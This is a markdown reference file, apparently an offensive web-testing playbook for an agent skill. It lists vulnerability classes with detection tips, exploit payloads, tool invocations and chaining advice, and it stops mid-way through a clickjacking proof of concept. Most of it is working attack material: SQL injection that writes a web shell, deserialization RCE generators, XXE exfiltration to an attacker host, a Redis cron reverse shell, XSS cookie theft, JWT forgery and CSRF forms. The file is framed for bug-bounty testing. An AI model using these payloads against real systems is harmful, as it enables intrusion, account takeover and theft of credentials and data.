# WEB MODE — Vulnerability Library (reference)

> Moved from web-mode/SKILL.md during the 2026-09-19 playbook split. Load on demand only.

## 3. Vulnerability Library

## Auth & Authorization

### 2FA / MFA Bypass
**Detect:** map every authenticated endpoint after MFA; strip MFA cookie/header — does the sensitive action still succeed? Check `/api/email/change`, `/api/2fa/disable`, `/api/password/change`.
**Exploit:** brute 6-digit code (10⁶ at 100 req/sec ≈ 167 min, often in scope); response manipulation `{"verified":false}`→`{"verified":true}`; status swap 401→200; token/code reuse; race verify+action in parallel; predictable backup codes; SMS fallback via un-MFA'd phone-change; OAuth path skips 2FA.
**Payloads:** send `code:''`, `code:null`, `code:[1,2,3]`, `code[]=` (type confusion).
**Chain:** MFA bypass → ATO → tenant takeover. **CVSS 8.5–9.5.**
```python
# Turbo Intruder 2FA code brute
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20)
    for i in range(0, 1000000):
        engine.queue(target.req, str(i).zfill(6))
def handleResponse(req, interesting):
    if 'success' in req.response or req.status == 200:
        table.add(req)
```

### Account Takeover (ATO) Chains
**Detect:** map every modify-account endpoint; ATO is the *impact*, chain the primitives.
**Exploit chains:** XSS/CSRF → `POST /api/email/change attacker@tld` → forgot-password → reset to attacker → login as victim. Reset token leaking via Referer from external img in email. OAuth account-merge squatting (pre-create with victim's email via social sign-in, no verification). 2FA bypass + reset. Session fixation via CSRF login. Cookie scope abuse via subdomain takeover. "Reset by phone" after changing number via missing-MFA endpoint.
**Chain:** always end at literal ATO PoC — log in as victim, show their data. **CVSS 9.0+.**

### Auth Bypass (logic / SQLi-in-login / SSO / cache key)
**Detect:** scan login flow for parsing inconsistencies before brute force.
**Exploit — path normalization** (403→200):
```
GET /admin/    GET /admin..;/  (Tomcat)   GET /admin/.
GET /%2e/admin  GET /admin%20   GET /;param=1/admin
GET //admin     GET /admin#     GET /admin?
```
**Header-based bypass:**
```
X-Original-URL: /admin     X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1  X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1   X-Real-IP / X-Remote-IP / X-Remote-Addr
Forwarded: for=127.0.0.1    True-Client-IP / Cluster-Client-IP / CF-Connecting-IP
```
**Method swap:** GET→POST/OPTIONS/TRACE. **HTTP/2 vs HTTP/1.1 differential** (WAF inspects only h1). **Vhost confusion** `Host: admin.target.com`. **Default creds:** `admin/admin`, `admin/password`, `admin/123456`, `admin/changeme`, `root/root`, `admin/target.com`.
```bash
ffuf -u 'https://target/admin' -H 'X-Original-URL: /admin' -mc 200,302
for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE PROPFIND; do
  echo -n "$m: "; curl -sk -o /dev/null -w '%{http_code}\n' -X $m https://target/admin
done
```
**Trap:** some 200s are error pages — check body, not just status. **Chain:** → ATO → tenant takeover. **CVSS 8.5–9.8.**

### IDOR / BOLA / BFLA
**Detect:** with user A's session, swap IDs (numeric, UUID, hash) with user B's; compare 200 vs 403. Try increment numerics, predict UUIDv1 (leaks MAC+time), deleted-but-resolved IDs, method swap `GET`→`PUT`.
**Payloads:**
```
GET /api/users/<other_id>           # vertical
GET /api/orders/<other_user_order>  # horizontal
GET /api/users/me/../<other_id>     # traversal-style
GET /api/users.json?id[]=1&id[]=2
PATCH /api/users/<id> {"role":"admin"}   # BFLA + mass assignment
```
**Bypass:** 403 on numeric → try UUID/base64/hash. GET blocked → POST + `_method=GET` / `X-HTTP-Method-Override: GET`. Use **Autorize** (log in as A, browse with B's creds — flags every same-response endpoint).
**Chain:** IDOR → admin object → BFLA → tenant takeover. **CVSS horiz 6.5–8.5, BFLA 9.0+.**

### Mass Assignment
**Detect:** read `GET /api/users/me` for all fields; PATCH/PUT each field back.
**Payload:**
```http
PATCH /api/users/me { "name":"x","isAdmin":true,"role":"admin",
  "permissions":["*"],"verified":true,"balance":999999,
  "tenant_id":"<other_tenant>","deleted":false }
```
Test camelCase, snake_case, dot.path, nested, `__proto__`. Discover hidden fields via JS source / Swagger / GraphQL introspection.
**Chain:** role=admin → tenant takeover. **CVSS 8.5–9.5.**

### JWT Attacks
**Detect:** decode token; note `alg`, `kid`, `jku`, `x5u`. Test alg=none, RS→HS (sign with public key as HMAC key), kid traversal/SQLi, jku/x5u override, weak-secret brute.
**Payloads:**
```
header: {"alg":"none","typ":"JWT"}  payload: {"sub":"admin",...}  sig: (empty)
kid: ../../../dev/null          # sign with empty key
kid: 'UNION SELECT 'AAAA'--     # sign HMAC-SHA256 key='AAAA'
jku: https://attacker.tld/jwks.json
```
```python
import jwt
pub = open('jwks_public.pem').read()
token = jwt.encode({'sub':'admin'}, pub, algorithm='HS256')
```
```bash
jwt_tool eyJhbGciOi... -T                  # tamper interactive
jwt_tool eyJ... -X a                       # alg=none
jwt_tool eyJ... -X k -pk public.pem        # confused-key
jwt_tool eyJ... -X i -I -pc name -pv admin # kid sqli
jwt_tool eyJ... -X s -ju https://attacker.tld/jwks.json -pk priv.pem
hashcat -a 0 -m 16500 token.txt rockyou.txt
```
**Chain:** forged token → ATO any user / role escalate. **CVSS 9.0+.**

### OAuth Misconfiguration
**Detect:** tamper redirect_uri, state, scope; test code reuse; test PKCE absence.
**Exploit:** loose `redirect_uri` (subdomain `attacker.target.com`, path `target.com/.attacker.tld`, query `target.com?next=attacker.tld`, fragment `#@attacker.tld`); missing `state` → CSRF on callback; code reuse → second access_token; scope upgrade `scope=admin`; PKCE missing on SPA/mobile → deep-link code interception; implicit flow + open redirect → token in fragment exfil; account squatting via social sign-in.
```bash
curl -sk "https://idp/auth?response_type=code&client_id=X&redirect_uri=https://attacker.tld&scope=openid&state=Y"
```
**Chain:** token theft → ATO. **CVSS 8.5–9.8.**

### SAML Attacks
**Detect:** Burp + SAMLRaider; decode/pretty-print every assertion.
**Exploit:** XML signature wrapping (move signed `<Assertion>`, insert unsigned one where verifier reads); XXE in metadata (often unauth fetch); comment injection in NameID:
```xml
<NameID>admin<!--injected-->@target.com</NameID>
```
(parser strips comment for username, signature over full string); assertion replay (no nonce, NotOnOrAfter unenforced); XSLT injection in `<ds:Transform>` → RCE.
**Chain:** SAML forgery → ATO across all federated apps. **CVSS 9.0+.**

### CSRF (classic / JSON / SameSite=Lax / login / logout)
**Detect:** remove token → still succeeds? Replace token with attacker's → wrong validation? Reuse old token → no per-session? `Content-Type: application/json`→`text/plain` → JSON CSRF. SameSite=Lax + GET state-change → CSRF via top-level nav.
**Payloads:**
```html
<form action="https://target.com/api/email/change" method="POST">
  <input name="email" value="attacker@tld">
</form><script>document.forms[0].submit()</script>
```
```html
<!-- JSON CSRF via text/plain -->
<form action="https://target.com/api/v1/payments" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":1000,"x":' value='"y"}'>
</form><script>document.forms[0].submit()</script>
```
**Bypass:** token validated only when present → omit; token tied to user not session → use attacker's; Referer substring match → `https://attacker.tld/target.com`; null Referer via `<meta name="referrer" content="never">`.
**Chain:** CSRF → email change → reset → ATO; CSRF → 2FA disable → ATO. **CVSS 8.0+.**

### Cross-Site WebSocket Hijacking (CSWSH)
**Detect:** cookie-based WS auth + missing `Origin` check on handshake.
**Exploit:** only route is cookie auth + absent origin check (token-in-header WS auth is safe).
**Payloads:** see WebSocket Attacks block.
**Chain:** subscribe to victim's private channel → message exfil → ATO. **CVSS 8.0+.**

### Rate-Limiting Bypass
**Detect:** hit endpoint 100× — does it block? After how many?
**Exploit:** spoof source-IP headers per request, rotate (`X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `Forwarded: for=`, `CF-Connecting-IP`, etc.); path tricks `/api/login/`, `/api//login`, `/api/login?a=b`, `/api/login;a=b`; method swap POST→PUT/PATCH; Host region swap; Content-Type swap; distributed multi-IP (cloud functions / fireprox); 50 parallel single-packet requests may all pass before counter increments.
```bash
python3 fireprox.py --command create --url https://target.com/api/login --region us-east-1 --profile_name default
```
**Trap:** per-account rate limits can't be IP-bypassed — rotate accounts. **Chain:** OTP brute → ATO.

---

## Injection

### SQL Injection (UNION / Boolean / Time / Error / OOB / Second-Order)
**Detect:** behavioral diff — `'` vs `"` vs `\'`; boolean `' AND '1'='1` vs `' AND '1'='2`; time `' OR pg_sleep(5)-- -`; error `' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -`; second-order via unique canary + Collaborator. Header-based SQLi (X-Forwarded-For/UA/Referer/Cookie) and JSON-body sinks (`{"sort":"id; DROP TABLE users-- -"}`) often forgotten.
**Payloads:**
```sql
-- MySQL
' UNION SELECT NULL,@@version,user(),database()-- -
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e))-- -
1' UNION SELECT 1,2,'<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/x.php'-- -
-- PostgreSQL
' OR pg_sleep(5)-- -
'; COPY x FROM PROGRAM 'curl http://attacker.tld/$(whoami)'-- -
'; SELECT pg_read_file('/etc/passwd', 0, 1000)-- -
-- MSSQL
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
-- Oracle
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
-- SQLite
' UNION SELECT NULL,sqlite_version(),NULL-- -
-- NoSQL (Mongo)
{"username":{"$ne":null},"password":{"$ne":null}}
{"$where":"sleep(5000)||true"}
{"username":"admin","password":{"$regex":"^(.{8}).*"}}
```
**WAF bypass:** `/**/`, `--+`, `#`, `;%00`; case `SeLeCt`; whitespace `%09 %0a %0b %0c %0d %a0`; hex literals `0x61646d696e`/`CHAR()/CHR()`; `UN/**/ION SE/**/LECT`; `SLEEP`→`BENCHMARK(5000000,SHA1(1))`.
```bash
sqlmap -u 'https://target/api?id=1' --batch --random-agent --level=3 --risk=2
sqlmap -r request.txt --batch --level=5 --risk=3 --tamper=between,space2comment,charencode --os-shell
sqlmap -u '...' --dns-domain=attacker.tld --technique=BU
```
**Trap:** `ORDER BY`/`LIMIT`/table names can't be parameterized → still injectable. **Chain:** → hash crack → ATO; → `INTO OUTFILE`/`xp_cmdshell`/`COPY PROGRAM` → RCE; → JWT secret → forge admin. **CVSS 9.8.**

### XXE (classic / blind / OOB / SSRF / RCE)
**Detect:** submit XML with custom DOCTYPE (SOAP, SAML metadata, SVG upload, DOCX/XLSX, RSS). 
**Payloads:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
```xml
<!-- SSRF to IMDS -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```
```xml
<!-- Blind OOB exfil (server doesn't reflect) -->
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.tld/x.dtd"> %dtd;]>
<foo>&send;</foo>
```
```xml
<!-- x.dtd on attacker host: -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.tld/?d=%file;'>">
%all;
```
**Bypass:** DOCTYPE blocked → XInclude `<xi:include parse="text" href="file:///etc/passwd"/>`; DTD external blocked → param entities only; egress blocked → `ftp://attacker.tld/?d=%file;`; UTF-16 encoding. Legacy PHP: `expect://id` RCE.
**Chain:** XXE → IMDS → cloud creds; → SAML/OAuth assertion forgery. **CVSS 8.5–9.5.**

### SSTI (Jinja2/Twig/Freemarker/Velocity/Smarty/ERB/Razor/Handlebars/Pug)
**Detect:** fingerprint via diff — `${7*7}`→49 (Freemarker/Velocity), `{{7*7}}`→49 (Jinja2/Twig/Pug), `<%= 7*7 %>`→49 (ERB/EJS), `{{7*'7'}}` Twig 49 / Jinja2 7777777.
**Payloads (killer set):**
```
Jinja2:  {{cycler.__init__.__globals__.os.popen('id').read()}}
         {{''.__class__.__mro__[1].__subclasses__()[XXX]("id",shell=True,stdout=-1).communicate()[0]}}
Twig:    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
         {{['/etc/passwd']|map('file_get_contents')|first}}
Freemarker: <#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
Velocity: #set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))...$ex.getInputStream()...
Smarty:  {php}system('id');{/php}
ERB:     <%= `id` %>   <%= IO.popen('id').read %>
Handlebars: {{#with "s" as |string|}}...{{this.push "return require('child_process').execSync('id');"}}...
Razor:   @{System.Diagnostics.Process.Start("cmd.exe","/c id");}
Mako:    ${self.module.cache.util.os.popen('id').read()}
```
**Bypass:** block `__class__` → `attr` filter `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}`; strip quotes → `request|attr(request.args.attr)` + `?attr=__class__`.
```bash
python3 tplmap.py -u 'https://target/?name=John' --os-cmd id
```
**Chain:** SSTI → RCE → env creds → cloud pivot. **CVSS 9.8.**

### Insecure Deserialization (Java/.NET/Python/Ruby/PHP/Node)
**Detect:** blobs — Base64 starting `rO0` (Java), `AAEAAA` (.NET), `O:` (PHP), Python pickle, Ruby Marshal, `_$$ND_FUNC$$_` (Node).
**Payloads:**
```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.tld/$(whoami)' | base64 -w0
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e ..."
phpggc Symfony/RCE4 system id -b
```
```python
import pickle, base64
class E:
  def __reduce__(self): return (__import__('os').system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
```
```js
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(e,o){console.log(o)});}()"}
```
**Trap:** JEP 290 filter requires allow-list — bypass via classes already on filter. **Chain:** → RCE → cluster takeover. **CVSS 9.8.**

### RCE — Command Injection & all vectors
**Detect:** timing — `;sleep 5`, `&& sleep 5`, `$(sleep 5)`, `` `sleep 5` ``, `|sleep 5`, `%0a sleep 5`, `\nsleep 5\n`.
**Payloads:**
```
;id  &id  |id  &&id  ||id  `id`  $(id)  ${id}  %0aid  %26%26id
```
**Sink map:** PHP `system/passthru/shell_exec/exec/preg_replace('/x/e')/create_function`; Python `os.system/subprocess(...,shell=True)/eval/pickle.loads/yaml.load`; Node `child_process.exec/eval/Function/vm.runInNewContext`; Java `Runtime.exec/ProcessBuilder/JNDI`; Ruby `system/backtick/Marshal.load`; .NET `Process.Start/cmd /c/BinaryFormatter`.
**Bypass:** spaces → `{cat,/etc/passwd}` / `cat$IFS/etc/passwd` / `cat${IFS}/etc/passwd`; `cat` → `tac`/`nl`/`c\at`/`'c'a't'`; `/` → `${PATH:0:1}`; alphanumeric blocked → POSIX `${0##*/}` / Bashfuck; `;` → `&&`,`||`,`%0a`; length limit → `bash -c {echo,YmFzaCAtaSAmZ}|{base64,-d}|bash`; stdout suppressed → `nslookup $(whoami).attacker.tld`.
**Legacy extras:** Shellshock header `User-Agent: () { :;}; /bin/bash -c 'id'`; XSLT `<xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>`; Imagetragick `fill 'url(https://attacker.tld/`id`)'`.
```bash
commix -u 'https://target/?cmd=id' --batch
nc -lvnp 4444   # or: pwncat-cs -lp 4444
```
**Chain:** → service creds → cloud → tenant. **CVSS 9.8 auth-less / 8.8 auth'd.**

### LFI / RFI / Path Traversal
**Detect:** `../../../../etc/passwd`, `..%2f..%2fetc%2fpasswd`, `....//....//etc/passwd`, `%2e%2e%2f%2e%2e%2fetc%2fpasswd`, `..%c0%af..%c0%afetc%c0%afpasswd`. Windows: `..%5c..%5c..%5cwindows%5cwin.ini`.
**Escalation paths:** `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/fd/0..255`, `/var/log/apache2/access.log` (log poisoning), `/var/lib/php/sessions/sess_<id>` (session poisoning), `~/.ssh/id_rsa`, `~/.aws/credentials`, `/var/www/html/wp-config.php`.
**PHP wrappers (in `include()`/`require()`):**
```
php://filter/convert.base64-encode/resource=index.php
php://input        (RCE if include)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
phar://upload.phar/evil
```
**Log-poison RCE:** inject `<?php system($_GET['c']); ?>` into log via UA/Referer → `?file=/var/log/apache2/access.log&c=id`.
**Bypass:** strip-once → `....//`; recursive → `%2e%2e%2f`; appended ext → `%00` (PHP<5.4) or 4096-char path truncation; literal blocked → `/etc/./passwd`, `/etc//passwd`.
```bash
ffuf -u 'https://target/?file=FUZZ' -w ~/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0
```
**Chain:** LFI→RCE (wrapper/log/session/proc); LFI→SSH key/DB creds. **CVSS 7.5 read / 9.8 RCE.**

### File Upload Bypass → RCE / Stored XSS / SSRF / DoS
**Detect:** map upload endpoint; test if path is web-rooted and executable.
**Extension bypass:**
```
shell.php  shell.PHP  shell.pHp  shell.php.jpg  shell.jpg.php
shell.php5  shell.phtml  shell.phar  shell.pht  shell.inc
shell.php\x00.jpg  shell.php%00.jpg  shell.php;.jpg
shell.php:.jpg   (NTFS ADS)   shell.php/   shell.php.   (trailing dot)
.htaccess   (AddType application/x-httpd-php .pwn)
```
**MIME bypass:** `Content-Type: image/png` + PHP body. **Magic byte:** `GIF89a;<?php system($_GET['c']); ?>`. **SVG XSS:** `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`. **Zip slip:** archive with `../../../../var/www/html/shell.php`. **web.config handler override (IIS).**
**Trap:** static-only S3 buckets won't execute PHP; SVG/HTML XSS still works. **Chain:** RCE / stored XSS / file overwrite / zip-bomb DoS. **CVSS 9.8 if RCE.**

### GraphQL Attacks
**Detect:** `/graphql`, `/api/graphql`, `graphiql`; test introspection.
**Payloads:**
```graphql
query { __schema { types { name fields { name } } } }
# alias-based rate-limit / log bypass
query { a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }
# batched
[{"query":"{ user(id:1){email} }"}, {"query":"{ user(id:2){email} }"}]
# field-level IDOR
query { user(id:"OTHER_USER_UUID"){ email phone ssn } }
# mutation injection
mutation { updateUserRole(userId:"victim", role:"admin") { id role } }
# depth-limit DoS
query Q($x:ID!){ user(id:$x){ posts{ author{ posts{ author{ posts{ author{ id }}}}}}}}
```
Test `Upload` scalar exposure → unauth file upload; GET-based GraphQL CSRF.
```bash
graphw00f -d -t https://target/graphql
clairvoyance -o schema.json -w ~/wordlists/graphql/graphql-words.txt https://target/graphql
```
**Chain:** introspection + alias batching + IDOR = mass PII dump. **CVSS 8.0–9.5.**

### Prototype Pollution (server + client)
**Detect:** inject `__proto__[isAdmin]=true` and observe later reads.
**Payloads:**
```http
POST /api/profile {"name":"x","__proto__":{"isAdmin":true}}
POST /api/profile {"name":"x","constructor":{"prototype":{"isAdmin":true}}}
```
```
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>
```
Sinks: `_.merge`, `_.set`, `_.defaultsDeep`, jQuery `extend`, Mongoose merge. **Bypass:** block `__proto__` → `constructor.prototype` → `["constructor"]["prototype"]`.
```bash
go run ppfuzz https://target/?param=value
```
**Chain:** `isAdmin:true` → BFLA; `process.env.NODE_OPTIONS=--inspect` → RCE. **CVSS 8.5–9.8.**

---

## Server-Side

### SSRF (basic / blind / DNS rebinding / gopher)
**Detect:** URL params (`?url=`, `?image=`, `?webhook=`, `?fetch=`, `?proxy=`, `?next=`, file upload URL fetcher, HTML→PDF, SSO callback). Collaborator hit confirms. Test `127.0.0.1`, `[::1]`, `169.254.169.254`.
**Cloud metadata (always start here):**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://[fd00:ec2::254]/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json   (Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01                (Metadata: true)
http://100.100.100.200/latest/meta-data/  http://169.254.169.254/v1.json  http://169.254.169.254/opc/v1/instance/
```
**IP/schema bypass:**
```
http://127.1  http://0177.0.0.1  http://2130706433  http://0x7f000001  http://[::ffff:127.0.0.1]
http://127.0.0.1.nip.io  http://attacker.tld@127.0.0.1  http://127.0.0.1#@allowedhost.com
gopher://127.0.0.1:6379/_<URL_ENCODED_REDIS_COMMAND>   dict://127.0.0.1:6379/info
file:///etc/passwd  ftp://attacker.tld/x  ldap://127.0.0.1  netdoc:///etc/passwd
```
**DNS rebinding:** `1.1.1.1.1time.169.254.169.254.repeat.rbndr.us` — first resolve passes whitelist, fetch resolves to IMDS. **Gopher→Redis RCE** via `gopherus`/`ssrfmap` (flushall, set cron `*/1 * * * * bash -c 'bash -i >& /dev/tcp/attacker.tld/4444 0>&1'`, config set dir/dbfilename, save).
```bash
interactsh-client -v
curl -sk "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<rolename>"
python3 ssrfmap.py -r request.txt -p url -m redis,readfiles,fastcgi
```
**Trap:** WAF strips IP literals → DNS rebinding or own CNAME to 127.0.0.1; egress blocked → DNS-only OOB. **Chain:** IMDS creds → S3/RDS → root; SSRF→Redis→RCE. **CVSS 9.0+ metadata / 6.0–7.5 blind.**

### HTTP Request Smuggling (CL.TE / TE.CL / TE.TE / H2.*)
**Detect:** smuggler.py / Burp HTTP Request Smuggler; differential timing.
**Payloads:**
```
# CL.TE
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```
**TE.TE obfuscation:** `Transfer-Encoding: chunked` / `Transfer-encoding: x` / `Transfer-Encoding : chunked` / `Transfer-Encoding: ,chunked` / `Transfer-Encoding: x,chunked`. H2.CL, H2.TE, H2.0 (request-line injection in pseudo-header).
```bash
python3 smuggler.py -u https://target -m GET
python3 h2cSmuggler.py -x http://target -u http://internal-only/
```
**Chain:** → bypass auth → ATO; → cache poisoning → mass XSS. **CVSS 9.0+.**

### Web Cache Poisoning
**Detect:** ParamMiner → Discover cache poisoning; or `X-Forwarded-Host: attacker.tld` reflected in `<base href>`.
**Payloads:**
```http
X-Forwarded-Host: attacker.tld
X-Forwarded-Scheme: http
X-Host: attacker.tld
X-Original-URL: /admin
```
**Exploit:** reflected unkeyed header + `<script src=//$xfh/x.js>` → mass XSS on every cache hit. **Verify:** `Cache-Control: public` / `X-Cache: HIT` from a second random IP/UA. **Trap:** `Vary` on the response = keyed; missing Vary on reflected header = vuln. **Chain:** → mass XSS → mass ATO. **CVSS 8.5+.**

### Web Cache Deception
**Detect:** dynamic path with cached extension.
**Exploit:** visit `/account/profile.css` (.jpg/.js/.svg) logged-in — backend ignores extension, CDN caches the private response; anonymous request to same URL gets victim data.
```
/account/profile;.css   /account/profile.css?cache-bypass-bypass=1
/account/profile/foo.css   /account/profile.css/anything
```
```bash
curl -sk -H "Cookie: session=$VICTIM" https://target/account/profile.css
curl -sk https://target/account/profile.css
```
**Chain:** → session token / PII leak → ATO. **CVSS 8.5–9.5.**

### Race Conditions (single-packet / sub-state / TOCTOU)
**Detect:** anywhere `check → mutate` (balance transfer, coupon redeem, vote, sign-up, follow, file rename).
**Exploit:** 30 identical requests in one TCP packet (HTTP/2 single-packet attack) — check passes in parallel before any mutation lands. Warm-up with benign HEAD if connection needs cooking.
```python
# Turbo Intruder race-single-packet-attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    engine.queue(target.req, gate='race1')
    for i in range(29):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
def handleResponse(req, interesting): table.add(req)
```
**Trap:** Cloudfront/nginx serialize on one connection — force 30 distinct TCP conns or h2 multiplex. **Chain:** infinite coupon / double-spend / role escalate. **CVSS 9.0 financial.**

### Business Logic Bugs
**Detect:** map the state machine; verify each transition only from the prior state; test replay, skip, branch.
**Exploit patterns:** negative quantity → negative balance; multiplier overflow wraps negative; replay checkout (no `payment_intent_id` dedup) → double credit; skip to step 5 directly; voucher reuse; sign-up race (same email twice, both verified); forced `PATCH /order/123 {state:'paid'}`; `creator_id` identity confusion; downgrade preserves pro features.
**Trap:** triagers are picky — **quantify** the $/points loss. **Chain:** → financial loss / data exfil / privesc. **CVSS up to 9.8.**

### HTTP Parameter Pollution
**Detect:** send `?param=a&param=b`; observe which the app reads.
**Primitive:** WAF sees first, app sees last — or concat. Layer map: PHP/Apache & Ruby & Perl → **last**; ASP.NET/ASP/IIS → **concat** (`,`); Node Express → **array**; Python Flask/Django & Java/Tomcat/Jetty → **first**.
```
?id=1&id=2    POST: id=1&id=2    JSON dup keys: {"id":1,"id":2}
```
**Chain:** HPP + WAF bypass / auth bypass / logic skew. **CVSS 5–8.**

### Host Header Attacks
**Detect:** trigger password reset, modify `Host:` → attacker.tld, observe email link.
**Payloads:**
```http
POST /api/forgot HTTP/1.1
Host: attacker.tld
{"email":"victim@target.com"}
```
```
Host: target.com            →  routing bypass via
X-Forwarded-Host: attacker.tld   Host: admin.internal.target.com
```
**Chain:** reset poisoning → ATO. **Trap:** modern ALLOWED_HOSTS mitigates — misconfig still common. **CVSS 8.5+.**

---

## Client-Side

### XSS (Reflected / Stored / DOM / mXSS / Universal)
**Detect:** reflected — canary `xss<u>{rand}</u>` into every param, grep encoded+unencoded reflections (gxss, kxss, dalfox); stored — canary into every input then crawl readers + blind hooks (XSS Hunter/Interactsh); DOM — Burp DOM Invader, trace `location.search`/`location.hash`/`postMessage` to sinks.
**Killer payloads by context:**
```html
<!-- HTML body -->
<svg/onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<!-- double-quoted attribute -->
" autofocus onfocus=alert(document.domain) x="
<!-- JS string -->
';alert(document.domain);//
<!-- template literal -->
${alert(document.domain)}
<!-- JSON-in-script -->
</script><svg/onload=alert(document.domain)>
<!-- URL/javascript: -->
javascript://%0aalert(document.domain)
<!-- filter bypass -->
<svg/onload=alert`1`>
<a href="jav&#x09;ascript:alert(1)">x</a>
<!-- DOMPurify 3.x mXSS -->
<math><mtext></form><form><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<!-- polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
**Exfil:**
```javascript
new Image().src='https://attacker.tld/?c='+btoa(document.cookie)
fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.tld/?d='+btoa(JSON.stringify(d))))
```
**WAF notes:** Cloudflare → `<svg/onload>`, newline-split `<svg\non\nload>`, `<svg/*x*/onload>`; Akamai → `<details>`, `<form><math><mtext>` splits; AWS WAF blocks `alert(1)` literal → `alert\u00281\u0029` / `window['al'+'ert'](1)`, pad past ~8KB; F5 → fragment DOM XSS (no server WAF inspects URL fragment). CSP → JSONP on allowed domain, open redirect as script src, AngularJS gadget, nonce reflection, `script-src 'self'` + `text/javascript` upload.
```bash
cat urls.txt | qsreplace 'xss"\'<svg' | kxss
cat urls.txt | dalfox pipe --silence -b your.xss.ht --skip-bav -o dalfox.txt
```
**Trap:** Self-XSS not a bug; HttpOnly cookies don't stop action-as-victim fetch chains. **Chain:** cookie/CSRF-token steal → ATO; stored admin XSS → tenant takeover; mXSS in HTML email → mail client compromise. **CVSS 6.1 reflected / 7.5+ stored / 7.4 DOM.**

### CSP Bypass
**Detect:** read CSP header; find weak host whitelists, `unsafe-inline`/`unsafe-eval`, nonce reflection, JSONP on allowed domain.
**Payloads:**
```html
<script src=https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)></script>
<script src=https://www.google.com/jsapi?callback=alert(1)></script>
<div ng-app ng-csp><div ng-click=$event.view.alert(document.domain)>x</div></div>
<script src="data:,alert(document.domain)"></script>
<base href=//attacker.tld>
```
**Trusted CDN takeover:** `script-src 'self' https://cdn.example.com` with unclaimed S3/Cloudfront under that host.
```bash
curl -sI https://target | grep -i content-security-policy
csp-evaluator-cli https://target
```
**Trap:** Strict-Dynamic closes most JSONP gadgets but still bypassable via DOM-clobbered nonce. **Chain:** + XSS = full exploitation. **CVSS +1.0–2.0 over base XSS.**

### DOM Clobbering
**Detect:** code reading `window.config`, `document.someName.foo` for security checks.
**Payloads:**
```html
<a id=defaultAvatar href=evil.tld>
<form id=user><input id=isAdmin value=true>
<img name=cookie src=//attacker.tld>
<!-- DOMPurify bypass -->
<form><input id=attributes>
```
**Chain:** clobber nonce read from `document.x` to beat strict CSP; → privesc/XSS. **Trap:** Shadow DOM + closures don't clobber. **CVSS 6.5–8.5.**

### postMessage Attacks
**Detect:** grep client JS for `addEventListener('message',...)` / `window.onmessage` with missing or weak origin checks or eval of `event.data`.
**Exploit:**
```html
<iframe src="https://target.com/?x=1" id=t></iframe>
<script>document.getElementById('t').contentWindow.postMessage({html:'<img src=x onerror=alert(1)>'},'*')</script>
```
```
vulnerable handler: window.addEventListener('message', e => { el.innerHTML = e.data.html; })
weak check: if (e.origin.includes('target.com'))   → matches target.com.attacker.tld
eval sink:  window.addEventListener('message', e => eval(e.data));
```
**Chain:** postMessage → DOM XSS → ATO. **CVSS 7.5–9.0.**

### Clickjacking
**Detect:** `curl -I` for `X-Frame-Options` / `CSP frame-ancestors` — absent or weak = frame-able.
**PoC:**
```html
<style>
  iframe { width: 1280px; height: 800px; opacity: 0.0001; position: absolute; top: 0; left: 0; }
